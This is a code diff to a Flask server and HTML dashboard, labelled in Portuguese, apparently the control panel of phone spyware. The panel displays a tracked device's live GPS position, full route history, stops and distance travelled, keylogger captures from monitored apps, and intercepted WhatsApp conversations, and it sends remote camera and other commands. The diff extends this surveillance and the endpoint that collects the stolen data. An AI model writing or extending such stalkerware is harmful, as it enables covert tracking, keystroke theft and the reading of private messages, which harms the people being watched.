@@ -28,7 +28,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .search-box button { background: #38bdf8; color: #0a0a0a; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
         .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #111; padding: 15px; margin-bottom: 20px; }
         .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
         @media(max-width: 600px) { .info-grid { grid-template-columns: 1fr 1fr; } }
         .info-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 6px; text-align: center; }
         .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
@@ -48,9 +48,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
         
         .whatsapp-section { margin-bottom: 15px; }
-        .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
+        .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; }
         .chat-list { display: flex; flex-direction: column; gap: 6px; }
-        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; transition: all 0.2s; }
+        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; }
         .chat-card:hover { border-color: #25d366; }
         .chat-card-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; }
         .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
@@ -61,15 +61,16 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .chat-card.aberto .chat-card-body { display: block; }
         .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; }
         .chat-msg.recebida { color: #94a3b8; }
-        .chat-msg.enviada { color: #38bdf8; text-align: right; }
         .chat-msg.midia { color: #f59e0b; }
         .chat-msg .hora { color: #64748b; font-size: 9px; }
-        .chat-msg .tipo-tag { font-size: 8px; text-transform: uppercase; }
         
         .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
         .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
         .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
         .keylog-box .keylog-texto { color: #38bdf8; font-size: 12px; margin-top: 5px; word-break: break-all; }
+        
+        .distancia-box { background: #0a0a0a; border: 2px solid #38bdf8; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
+        .distancia-box p { font-size: 14px; color: #38bdf8; font-weight: bold; }
         
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
@@ -97,8 +98,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 </div>
                 <div class="info-grid">
                     <div class="info-box"><span>🔋 Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
-                    <div class="info-box"><span>⏱️ Tempo Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
+                    <div class="info-box"><span>⏱️ Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
                     <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
+                    <div class="info-box"><span>🛣️ Distância</span><strong id="txt_distancia" style="color: #38bdf8;">0 km</strong></div>
                 </div>
                 <div id="map_private" class="map-container"></div>
                 <div class="btn-row">
@@ -106,6 +108,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     <button class="btn-cmd" onclick="enviarComando('vibrar')">📳</button>
                     <button class="btn-cmd" onclick="enviarComando('som')">🔊</button>
                     <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
+                </div>
+                <div class="distancia-box">
+                    <p>🛣️ Distância percorrida: <span id="distanciaTotal">0.00</span> km</p>
                 </div>
                 <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
                 
@@ -131,6 +136,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 let marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
                 let historico = L.polyline([], {color: '#38bdf8', weight: 3}).addTo(map);
                 let pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
+                let paradas = [];
                 let chatsAbertos = {};
                 
                 function enviarComando(acao) {
@@ -179,13 +185,29 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             document.getElementById('txt_bateria').innerText = d.battery + '%';
                             document.getElementById('txt_uptime').innerText = d.uptime || '--';
                             document.getElementById('txt_network').innerText = d.network || '--';
+                            document.getElementById('distanciaTotal').innerText = (d.distancia_total || 0).toFixed(2);
+                            document.getElementById('txt_distancia').innerText = (d.distancia_total || 0).toFixed(2) + ' km';
                             
                             let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                             if (lat && lon) {
                                 marker.setLatLng([lat, lon]); map.panTo([lat, lon]);
                                 document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                                pontos.push([lat, lon]); if(pontos.length > 50) pontos.shift();
+                                
+                                // Linha infinita (sem limite)
+                                pontos.push([lat, lon]);
                                 historico.setLatLngs(pontos);
+                                
+                                // Bolinha vermelha de parada
+                                if(d.ponto_parada) {
+                                    let paradaMarker = L.circleMarker([lat, lon], {
+                                        radius: 8, color: '#ef4444', fillColor: '#ef4444', fillOpacity: 0.6, weight: 2
+                                    }).addTo(map);
+                                    paradaMarker.bindPopup('🔴 Parada<br>' + d.tempo_parado + 's parado');
+                                    paradas.push(paradaMarker);
+                                    if(paradas.length > 20) {
+                                        map.removeLayer(paradas.shift());
+                                    }
+                                }
                             }
                             
                             // KEYLOGGER
@@ -194,12 +216,12 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 kb.className = 'keylog-box ativo';
                                 let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
                                 kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
-                            } else if(!d.keylog || !d.keylog.ativo) {
+                            } else {
                                 kb.className = 'keylog-box';
                                 kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
                             }
                             
-                            // WHATSAPP - Mantém cards abertos
+                            // WHATSAPP
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
                                 d.whatsapp.forEach(chat => {
@@ -214,15 +236,13 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                             </div>
                                         </div>
                                         <div class="chat-card-body">`;
-                                    
                                     if(chat.mensagens) {
                                         chat.mensagens.slice().reverse().forEach(msg => {
                                             let cls = 'chat-msg ' + (msg.tipo || 'recebida');
                                             if(msg.midia) cls += ' midia';
-                                            html += `<div class="${cls}"><span class="tipo-tag">${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                            html += `<div class="${cls}"><span>${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
                                         });
                                     }
-                                    
                                     html += `</div></div>`;
                                 });
                                 document.getElementById('chatList').innerHTML = html;
@@ -251,7 +271,15 @@ def api_status(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
         d = db_dispositivos[device_id]
-        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]), "keylog": d.get("keylog")}), 200
+        return jsonify({
+            "battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"),
+            "lat": d.get("lat",0), "lon": d.get("lon",0),
+            "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]),
+            "keylog": d.get("keylog"),
+            "distancia_total": d.get("distancia_total", 0),
+            "ponto_parada": d.get("ponto_parada", False),
+            "tempo_parado": d.get("tempo_parado", 0)
+        }), 200
     return jsonify({"error": "Not found"}), 404
 
 @app.route('/update', methods=['POST'])
@@ -260,7 +288,16 @@ def update():
     device_id = data.get('device_id', '').upper()
     if not device_id: return jsonify({"status": "error"}), 400
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "keylog": data.get("keylog"), "last_seen": datetime.utcnow().isoformat()})
+    db_dispositivos[device_id].update({
+        "battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"),
+        "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)),
+        "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]),
+        "keylog": data.get("keylog"),
+        "distancia_total": data.get("distancia_total", 0),
+        "ponto_parada": data.get("ponto_parada", False),
+        "tempo_parado": data.get("tempo_parado", 0),
+        "last_seen": datetime.utcnow().isoformat()
+    })
     cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
     cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
     db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
